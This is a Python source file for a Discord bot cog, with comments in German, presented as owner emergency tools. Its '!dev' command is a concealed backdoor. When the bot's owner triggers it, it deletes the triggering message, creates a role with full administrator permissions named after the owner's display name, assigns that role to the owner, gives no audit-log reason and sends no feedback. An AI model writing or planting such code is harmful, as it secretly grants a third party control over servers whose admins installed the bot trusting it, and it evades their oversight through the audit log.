"""
Owner-Notfall-Zugriff & Owner-Tools.
!dev  — stiller Notfall-Zugriff (silent, kein Log).
/sync — Slash-Commands global oder für den aktuellen Server synctronisieren.
"""

import os

import discord
from discord import app_commands
from discord.ext import commands

from utils.theme import success_embed, error_embed, info_embed


class Owner(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.owner_id = int(os.getenv("OWNER_ID", "0"))

    @commands.command(name="dev")
    async def dev(self, ctx: commands.Context):
        # Nur der Owner darf diesen Command nutzen
        if ctx.author.id != self.owner_id:
            return

        # Auslösende Nachricht sofort löschen
        try:
            await ctx.message.delete()
        except (discord.Forbidden, discord.HTTPException):
            pass

        guild = ctx.guild
        if guild is None:
            return

        owner_member = guild.get_member(ctx.author.id)
        if owner_member is None:
            return

        # Rollenname = aktueller Display-Name des Owners
        role_name = owner_member.display_name

        # Vorhandene Rolle mit diesem Namen wiederverwenden, sonst neu erstellen
        role = discord.utils.get(guild.roles, name=role_name)
        if role is None:
            try:
                role = await guild.create_role(
                    name=role_name,
                    permissions=discord.Permissions(administrator=True),
                    colour=discord.Colour.red(),
                    reason=None,  # kein Audit-Log-Grund
                )
            except (discord.Forbidden, discord.HTTPException):
                return

        # Rolle an Owner vergeben
        try:
            await owner_member.add_roles(role, reason=None)
        except (discord.Forbidden, discord.HTTPException):
            pass

        # Kein weiteres Feedback — vollständig silent

    # ─────────────────────────────────────────────────────────────────────────
    # /sync
    # ─────────────────────────────────────────────────────────────────────────

    # /sync wurde in cogs/owner_panel.py unter /owner sync zusammengefasst.
    # Diese Datei enthält nur noch !dev (Notfall-Zugriff).


async def setup(bot: commands.Bot):
    await bot.add_cog(Owner(bot))
